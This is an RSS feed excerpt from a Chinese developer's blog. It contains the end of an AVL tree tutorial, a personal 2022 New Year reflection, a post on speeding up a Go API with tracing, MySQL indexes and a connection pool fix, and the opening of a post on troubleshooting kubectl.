&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># AVL 树旋转后根节点可能不再是现在这个节点，需要重新寻找根节点&lt;/span>
&lt;span class="n">top&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="n">top&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">top&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">top&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">top&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="nb">bool&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;search a value
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Args:
&lt;/span>&lt;span class="s2"> value (int): searching value
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">False&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="总结">总结&lt;/h2>
&lt;p>AVL树只要理解和左右旋转的方法和作用，就不难理解左右旋转与双旋转的意义了。&lt;/p>
&lt;p>单次旋转的目的都是将两侧子树，一颗子树高度+1，一颗子树高度-1，将高度相差2的两颗子树重新平衡。&lt;/p>
&lt;p>单次旋转的限制是只能降低子树中一颗子树的高度，左子树的左子树或右子树的右子树，所以一旦出现左右子树中最高的子树不是左-左或右-右，单次旋转就不能重新平衡。对这种情况，先旋转子树，令左-左或右-右成为最高的子树后，再对根节点旋转，就能重新平衡了。&lt;/p></description></item><item><title>2022新年第一篇博客</title><link>https://nnnewb.github.io/blog/p/first-blog-in-2022/</link><pubDate>Wed, 09 Feb 2022 09:24:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/first-blog-in-2022/</guid><description>&lt;h2 id="一">一&lt;/h2>
&lt;p>其实年前还有一篇写了蛮长的，但因为种种原因反正假期内是没继续动笔写完，今天本来打算继续写，但是看了眼开头，还是把全文 ctrl+a delete 了。&lt;/p>
&lt;p>这次就短一点。&lt;/p>
&lt;h2 id="二">二&lt;/h2>
&lt;p>回顾过去，2021年对我而言是怎样的一年？&lt;/p>
&lt;p>当我问自己这个问题，我才发现似乎没有一个能脱口而出的答案。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093132174.png"
width="870"
height="154"
srcset="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093132174_hu312baa1af15bc0284994619b812524f6_3754_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093132174_hu312baa1af15bc0284994619b812524f6_3754_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220209093132174"
class="gallery-image"
data-flex-grow="564"
data-flex-basis="1355px"
>&lt;/p>
&lt;p>普普通通地正常工作，顺便也摸摸鱼。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093249061.png"
width="728"
height="147"
srcset="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093249061_huc19f43cf1d7a348ef7c6f534f3f07c4a_8775_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093249061_huc19f43cf1d7a348ef7c6f534f3f07c4a_8775_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220209093249061"
class="gallery-image"
data-flex-grow="495"
data-flex-basis="1188px"
>&lt;/p>
&lt;p>偶尔也上GitHub看两眼，有没有什么新鲜玩意儿。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093447327.png"
width="452"
height="129"
srcset="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093447327_hucfe56099574b6d1070a7ba458db01ed2_7134_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093447327_hucfe56099574b6d1070a7ba458db01ed2_7134_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220209093447327"
class="gallery-image"
data-flex-grow="350"
data-flex-basis="840px"
>&lt;/p>
&lt;p>学了点没用的逆向技术，demo也勉强凑出9+1个star。不过趁这个机会倒是了解了下x86汇编语言，姑且算是个没什么卵用的进步，主流64位的汇编和arm的汇编还是不懂，x86也只能算是盲人摸象。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093903198.png"
width="366"
height="123"
srcset="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093903198_hu1a597d42e008a51b6b7e3058561fedc4_7207_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209093903198_hu1a597d42e008a51b6b7e3058561fedc4_7207_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220209093903198"
class="gallery-image"
data-flex-grow="297"
data-flex-basis="714px"
>&lt;/p>
&lt;p>又一个玩具，这类玩具太多了。我水平不够，完成度也低，只能说是写这个的时候就是打发时间。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209094119262.png"
width="256"
height="121"
srcset="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209094119262_huba5eeb6809b4946e971e1798bbd4c32c_4701_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209094119262_huba5eeb6809b4946e971e1798bbd4c32c_4701_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220209094119262"
class="gallery-image"
data-flex-grow="211"
data-flex-basis="507px"
>&lt;/p>
&lt;p>本来不是很看得上 dtm 这个项目。不为别的，就是觉得作者 segmentfault 上刷博文宣传自己的框架有种保险推销员的感觉，让人觉得不靠谱。但还是老实去看了代码，毕竟比起 Java 写得 seata 之类的框架，dtm 封装比较薄，源码稍微好读一点。&lt;/p>
&lt;p>实际读起来感觉还是有点混乱，最后照着 dtm 文档的时序图写了个案例，配置了opentelemetry。分布式追踪真的很好用，讲真，要是单体应用也能跟着函数追踪出这样一个图就绝了。我觉得可以拿 python 开刀试试。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209095328828.png"
width="355"
height="131"
srcset="https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209095328828_hu09413e63593e9e88b5002d57426f4aa7_9471_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/first-blog-in-2022/image-20220209095328828_hu09413e63593e9e88b5002d57426f4aa7_9471_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220209095328828"
class="gallery-image"
data-flex-grow="270"
data-flex-basis="650px"
>&lt;/p>
&lt;p>尝试入门密码学，但数学基础不好，为了搞明白希尔密码用到的矩阵运算翻了半天搜索引擎才写出来。结果还是没继续学下去。2022也许继续看？好歹把传统密码里的DES、AES学完吧，不求能手写，大概能看明白过程就好。要是能再把原理懂个大概就更好了。&lt;/p>
&lt;p>至于别的，也许我能报菜名一样提一大堆名字，但终究骗不了我自己。是，2021一年时间，各种杂七杂八的技术概念和新名词碰了一堆，但杂而不精，几乎没有什么真正吸收、融会贯通的内容。&lt;/p>
&lt;h2 id="三">三&lt;/h2>
&lt;p>工作和生活上还是老一套。&lt;/p>
&lt;p>产品经理走了，于是部门间的矛盾和磨合又来了。我甚至不愿意管这个叫“磨合”，无非是两边一起摆烂罢了。所以还是到此为止，只能期盼好聚好散，2022尝试跳个愿意出更高工资的地方，也许能在中年危机前攒够本钱，下半生是自己做点生意也好，安心打工也好，至少能安顿好一家人，即便不能富足，也得温饱。真心希望这个渺小的愿望可以实现。&lt;/p>
&lt;p>生活上，年底才收到一个坏消息，爷爷病了，可能是肺癌。很难描述听到这个消息的时候我的心情。上初中的时候我的曾祖父去世了，我和曾祖父交流接触很少，但还是有种心里缺了一块的感觉。&lt;/p>
&lt;p>是，人终有一死。但出奇的是我一点也没想什么轻于鸿毛重于泰山。死亡就只是死亡而已，没有意义，什么也没有。时间最终会抚平一切。&lt;/p>
&lt;p>好了。&lt;/p>
&lt;p>2022，还是祝愿爷爷他手术顺利，能活到120岁。&lt;/p>
&lt;h2 id="四">四&lt;/h2>
&lt;p>还是要展望下未来的。&lt;/p>
&lt;p>2022年，很快就要26周岁了，还是单身，一年的收入大概能在广州买一两平米的卫生间，存款不比一间卫生间的价值多多少。有一点焦虑。&lt;/p>
&lt;p>焦虑的原因在于我觉得自己配得上更高的工资，或者说，更好的生活，有看得到希望的未来。但理想和现实的矛盾始终无法解决。&lt;/p>
&lt;p>不说那么多了。&lt;/p>
&lt;p>今年有跳槽的想法，也有考个系统分析师证书的想法，但两者恐怕不好兼顾。还好的是系统分析师考试在5月，这段时间来个百日冲刺，运气好的话有机会拿到证书，再在下半年靠证书跳个更高薪的职位。运气不好的话，今年没考上，下半年跳槽还有悬念，那就明年再说了。&lt;/p>
&lt;p>另外更新简历的时候发现，多写点博客还是挺唬人的。21年下半年几个月写了40篇，2022年继续保持的话起码一年一百篇不过分吧，坚持多写几篇，笔耕不辍。&lt;/p>
&lt;p>最好再参与下知名的开源项目，发几个PR。&lt;/p>
&lt;p>小说也想写，短篇整个十几万字总得有。&lt;/p>
&lt;p>梦想嘛，还是要有的。&lt;/p>
&lt;h2 id="来吧2022">来吧，2022！&lt;/h2></description></item><item><title>记一次API响应时间优化</title><link>https://nnnewb.github.io/blog/p/an-api-response-time-optimize/</link><pubDate>Fri, 31 Dec 2021 18:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/an-api-response-time-optimize/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>刚接手管理后台的后端服务，先随便挑个什么东西下手看看。正好注意到一个简单的接口返回时间都蛮长的，于是拿刚从 opentelemetry 的 issue/pr 里抄来的 sqlmw 包装驱动来分析优化下性能。&lt;/p>
&lt;h2 id="0x01-性能分析">0x01 性能分析&lt;/h2>
&lt;h3 id="预判">预判&lt;/h3>
&lt;p>下手前预估下可能存在瓶颈的地方。对于这次下手的接口（&lt;code>get_users&lt;/code>），整个实现也没几行代码，只有两三个查询，数据量也不大，但是耗时有80ms+。&lt;/p>
&lt;p>其他接口有快有慢，并没有表现出同时增加耗时，而且开发服务器架在内网，排除网络原因，大概还是服务本身的存在的问题。于是考虑瓶颈在数据库或代码中，但具体肯定是要看代码去分析的。既然判断是代码里的问题，那下一步就是测量下耗时情况了。&lt;/p>
&lt;p>对于go，&lt;code>pprof&lt;/code>虽然是个不错的主意，但实话说部署在 kubernetes 里，配 &lt;code>pprof&lt;/code> 去拉结果有点麻烦，而且还有点点用不惯。正好这个项目里早就配置了 &lt;code>opentracing&lt;/code>+&lt;code>jaeger&lt;/code>做分布式跟踪，所以就直接抄一下 opentelemetry 的 &lt;a class="link" href="https://github.com/seslattery/otelsql/blob/master/otelsql.go" target="_blank" rel="noopener"
>otelsql&lt;/a> ，把SQL查询的详细耗时情况记录下来，就可以开始分析了。&lt;/p>
&lt;h3 id="opentracing收集数据">opentracing收集数据&lt;/h3>
&lt;p>&lt;code>otelsql&lt;/code> 原理是用 &lt;a class="link" href="https://github.com/ngrok/sqlmw" target="_blank" rel="noopener"
>sqlmw&lt;/a> 在 sql 驱动层级上进行包装&lt;code>sql ==&amp;gt; sqlmw.Driver{mysql.Driver}&lt;/code> 。go的&lt;code>sql&lt;/code>调用&lt;code>sqlmw.Driver&lt;/code>，&lt;code>sqlmw.Driver&lt;/code>调用&lt;code>mysql.Driver&lt;/code>，如此而已，具体不解释。&lt;/p>
&lt;p>从&lt;code>otelsql&lt;/code>借鉴下思路即可，现在 &lt;code>opentracing&lt;/code> 已经和 &lt;code>opencensus&lt;/code> 合并成了 &lt;code>opentelemetry&lt;/code>，但项目也没法说升级就升级，毕竟项目架构设计稀烂，太多地方和 &lt;code>opentracing&lt;/code>、&lt;code>jaeger-client&lt;/code> 强耦合了。把&lt;code>otelsql&lt;/code>里用&lt;code>sqlmw&lt;/code>的部分抄出来，改成&lt;code>opentracing&lt;/code>的方式创建&lt;code>span&lt;/code>完事。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">in&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">sqlInterceptor&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">ConnExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">conn&lt;/span> &lt;span class="nx">driver&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ExecerContext&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">query&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">args&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">driver&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">NamedValue&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">driver&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">span&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ctx&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">opentracing&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">StartSpanFromContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;ConnExecContext&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">span&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Finish&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">span&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">LogKV&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;sql.query&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">query&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">args&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如此一来， 当go的&lt;code>sql&lt;/code>库访问数据库的时候，就会在&lt;code>jaeger&lt;/code>里记录一个&lt;code>span&lt;/code>，可以清晰地看到耗时情况。&lt;/p>
&lt;h3 id="分析">分析&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/an-api-response-time-optimize/image-20211231103911728.png"
width="1166"
height="563"
srcset="https://nnnewb.github.io/blog/blog/p/an-api-response-time-optimize/image-20211231103911728_hu4ca051d63fb418ff00457f384002403d_37132_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/an-api-response-time-optimize/image-20211231103911728_hu4ca051d63fb418ff00457f384002403d_37132_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211231103911728"
class="gallery-image"
data-flex-grow="207"
data-flex-basis="497px"
>&lt;/p>
&lt;p>收集到耗时情况后开始观察，注意到两个问题：&lt;/p>
&lt;ol>
&lt;li>&lt;code>ConnectorConnect&lt;/code> 在每个请求前出现，每次耗时 2ms 左右。但 &lt;code>sql&lt;/code> 是有连接池的，这里每次执行查询都产生一次连接显然不对劲。&lt;/li>
&lt;li>&lt;code>StmtQueryContext&lt;/code> 出现一个耗时极长的查询，占据接近1/2的请求耗时，这条查询就是主要瓶颈。&lt;/li>
&lt;/ol>
&lt;p>慢查询的SQL如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">role&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">create_timestamp&lt;/span>&lt;span class="o">&amp;gt;?&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">create_timestamp&lt;/span>&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>是一个简单的 &lt;code>select count(1)&lt;/code> 查询，初步考虑是 &lt;code>where&lt;/code> 里少了索引。&lt;/p>
&lt;h2 id="0x02-优化">0x02 优化&lt;/h2>
&lt;h3 id="索引优化">索引优化&lt;/h3>
&lt;p>既然少索引，那就考虑下加索引。看了下数据库，&lt;code>role&lt;/code>和&lt;code>create_timestamp&lt;/code>字段都没有索引，于是先分别加上了索引，再 &lt;code>explain&lt;/code> ，发现查询类型已经变成了 &lt;code>ref&lt;/code> 。再运行查询，发现耗时依然有 20ms+。&lt;/p>
&lt;p>参考 &lt;a class="link" href="https://dev.mysql.com/doc/refman/5.7/en/multiple-column-indexes.html" target="_blank" rel="noopener"
>multiple-column index&lt;/a> 中的话：&lt;/p>
&lt;blockquote>
&lt;p>MySQL can use multiple-column indexes for queries that test all the columns in the index, or queries that test just the first column, the first two columns, the first three columns, and so on. If you specify the columns in the right order in the index definition, a single composite index can speed up several kinds of queries on the same table.&lt;/p>
&lt;/blockquote>
&lt;p>文档中还说：&lt;/p>
&lt;blockquote>
&lt;p>If a multiple-column index exists on &lt;code>col1&lt;/code> and &lt;code>col2&lt;/code>, the appropriate rows can be fetched directly. If separate single-column indexes exist on &lt;code>col1&lt;/code> and &lt;code>col2&lt;/code>, the optimizer attempts to use the Index Merge optimization (see &lt;a class="link" href="https://dev.mysql.com/doc/refman/5.7/en/index-merge-optimization.html" target="_blank" rel="noopener"
>Section 8.2.1.3, “Index Merge Optimization”&lt;/a>), or attempts to find the most restrictive index by deciding which index excludes more rows and using that index to fetch the rows.&lt;/p>
&lt;/blockquote>
&lt;p>也就是说，如果&lt;code>role&lt;/code>和&lt;code>create_timestamp&lt;/code>分别有索引，&lt;code>mysql&lt;/code>会尝试用 &lt;em>Index Merge Optimization&lt;/em> 算法来优化查询。但如果有多列索引的话，就能直接获取（文档里的场景能直接获取，但上文的 &lt;code>count(1)&lt;/code> 查询应该不行）。&lt;/p>
&lt;p>于是加上多列索引，再&lt;code>explain&lt;/code>，发现查询类型变成了&lt;code>range&lt;/code>，实际执行发现查询耗时降低至 5ms 左右。&lt;/p>
&lt;h3 id="连接池优化">连接池优化&lt;/h3>
&lt;p>go的&lt;code>sql&lt;/code>包自带连接池应该是比较清楚的。原本怀疑是不是对&lt;code>sql.DB&lt;/code>这个结构的用法有问题，但翻了下源码，发现&lt;code>sql.DB.ExecContext&lt;/code>之类的接口都会通过连接池取连接，完成后返回连接池。所以理论上来说都应该走连接池的连接，而不是每次查询都创建——除非连接池里没有可用的连接了。另外也谷歌了一圈，&lt;code>sql.DB&lt;/code> 似乎也没有什么特别的最佳实践，并没有人提到要手动&lt;code>DB.Conn&lt;/code>取连接后自己处理。&lt;/p>
&lt;p>于是初步怀疑下是不是哪里设置了连接池属性出了问题。通过排查源码中设置连接池属性的地方，发现一个自己埋下的坑。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">if&lt;/span> &lt;span class="nx">env&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DEBUG&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">mysqldb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SetMaxIdleConns&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">cfg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">mysql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ParseDSN&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">host&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">cfg&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">mysql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Config&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nf">StartObverseSQLConnPool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">cfg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DBName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">mysqlDB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Duration&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Second&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>因为我司这个项目没有配置 metrics 收集和分析，自然也没收集服务的连接池情况。所以当初入职后遇到一个奇怪的连接池耗尽，服务假死，调用栈全部卡在连接池上的问题时，为了判断是不是出现连接泄露，写了个goroutine去监测连接池里连接获取和释放的情况&amp;hellip;&lt;/p>
&lt;p>为了调试方便，还把&lt;code>SetMaxIdleConns&lt;/code>设置为了0。&lt;/p>
&lt;p>于是初步怀疑就是这个原因导致连接池罢工，将整段调试代码注释掉之后，再次访问接口，响应时间降低至9.8ms。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/an-api-response-time-optimize/image-20211231110219407.png"
width="212"
height="111"
srcset="https://nnnewb.github.io/blog/blog/p/an-api-response-time-optimize/image-20211231110219407_hu55ac2a3a3dacd3b69ab961805df24cc9_3194_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/an-api-response-time-optimize/image-20211231110219407_hu55ac2a3a3dacd3b69ab961805df24cc9_3194_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211231110219407"
class="gallery-image"
data-flex-grow="190"
data-flex-basis="458px"
>&lt;/p>
&lt;p>最大头的耗时依然是&lt;code>count(1)&lt;/code>查询。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/an-api-response-time-optimize/image-20211231110316414.png"
width="1559"
height="438"
srcset="https://nnnewb.github.io/blog/blog/p/an-api-response-time-optimize/image-20211231110316414_hu2a272a2603430f6072c0c8e118d561d2_28788_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/an-api-response-time-optimize/image-20211231110316414_hu2a272a2603430f6072c0c8e118d561d2_28788_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211231110316414"
class="gallery-image"
data-flex-grow="355"
data-flex-basis="854px"
>&lt;/p>
&lt;p>默认情况下 IdleConn 只有 2，超时也比较短。实际参数应该根据业务访问情况来安排。我这也没什么好的计算公式。连接池参数有问题会影响单条SQL的基本耗时，请求里三四条查询，每条加上几个ms，整个请求时间就拖长了十几ms。在微服务系统里影响还可能放大，别的服务要是多次调用，积累的时延可能就要上百ms了。&lt;/p>
&lt;h3 id="缓存优化">缓存优化&lt;/h3>
&lt;p>进一步的优化思路就是做缓存。是为了提高服务响应速度，也是为了提高负载能力、减轻查询压力，保护 MySQL 服务。过去年轻无知犯过错，就是考虑性能的时候只关注到了自己写的代码，认为代码跑得快重要——比如把 C 的执行性能吹上天。但事情从来不是这么简单——辩证法说实事求是，要具体问题具体分析。后端从来不是“我的代码”这么简单，如果不能从整个系统的角度出发发现问题，那就算是 CPU 成精了也没辙。&lt;/p>
&lt;p>对于实时性要求不高的接口，将数据缓存一段时间是绝对没问题的。不过因为做缓存是个系统性的事情——要考虑缓存更新的嘛，也不是每个接口都适合缓存，实时性有要求或者查询太复杂的话宁可考虑换成 ES 一类的分布式系统，把压力分摊到更多机器上。当然也意味着要花更多的钱，更难维护。&lt;/p>
&lt;p>我司项目就是个很沙雕的例子，因为最初就没设计缓存，连SQL都在用手工拼接，现在干脆变成了混用 &lt;code>xorm&lt;/code> 和 &lt;code>sql&lt;/code>。虽然也可以考虑下用 &lt;code>sqlmw&lt;/code> 插个缓存，但毕竟没验证过，做第一个吃螃蟹的也意味着要第一个背锅。&lt;/p>
&lt;p>总之，要做那可简单了，直接调 &lt;code>redis&lt;/code> 客户端（已经包装过一个 &lt;code>cachetools&lt;/code>）设置下缓存，给个时限就完了。缓存过期的时候加个 &lt;code>redlock&lt;/code>，让其他客户端先返回旧数据，更新完解锁，所有客户端都返回新数据。&lt;/p>
&lt;p>更系统化的处理，就要考虑下怎么做一个或多个更通用（对业务场景而言更通用，而不是真的对 &lt;em>所有&lt;/em> 场景都通用）的缓存层——在SQL驱动层做缓存？ORM层缓存？在请求/响应中做缓存？业务/数据访问层（如&lt;code>DAO&lt;/code>）做缓存？缓存用什么键？怎么覆盖尽可能多的查询场景？整个重构的工程量如何把握？值不值得？&lt;/p>
&lt;h2 id="结论">结论&lt;/h2>
&lt;p>收集性能数据的主要方式：&lt;/p>
&lt;ul>
&lt;li>metrics&lt;/li>
&lt;li>pprof&lt;/li>
&lt;li>opentracing/opentelemetry&lt;/li>
&lt;/ul>
&lt;p>优化手段：&lt;/p>
&lt;ul>
&lt;li>&lt;code>explain&lt;/code> 分析查询、优化和建立索引&lt;/li>
&lt;li>优化连接池参数&lt;/li>
&lt;li>加缓存&lt;/li>
&lt;/ul>
&lt;p>还有最重要的，&lt;strong>具体问题具体分析&lt;/strong>。&lt;/p></description></item><item><title>排查一个kubectl无反应的问题</title><link>https://nnnewb.github.io/blog/p/why-my-kubectl-not-responding/</link><pubDate>Mon, 27 Dec 2021 15:21:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/why-my-kubectl-not-responding/</guid><description>&lt;p>懒得分段了，就当做是讲个故事吧。&lt;/p>
&lt;p>背景大概是这样。&lt;/p>
&lt;p>内网公共开发机上配置了 k3s 集群，同时后端开发工作也在这台开发机上进行（通过vscode remote-ssh）。因为公司太抠门，开发机只有117G硬盘容量，除去必要的开发工具、系统环境之类的东西，实际可用一直没超过50%，机器上又跑了很多东西，像是 gitlab-runner、docker的registry、MySQL、elasticsearch、开发集群服务等等，差不多每一两个星期都会出现 disk-pressure 的 taint，导致 pod 被 evicted。实话说能跑就很满足了，毕竟公司抠门到开发部门的上行带宽都贼小，如果把镜像推送到公网的registry去部署的话体验更差。&lt;/p>
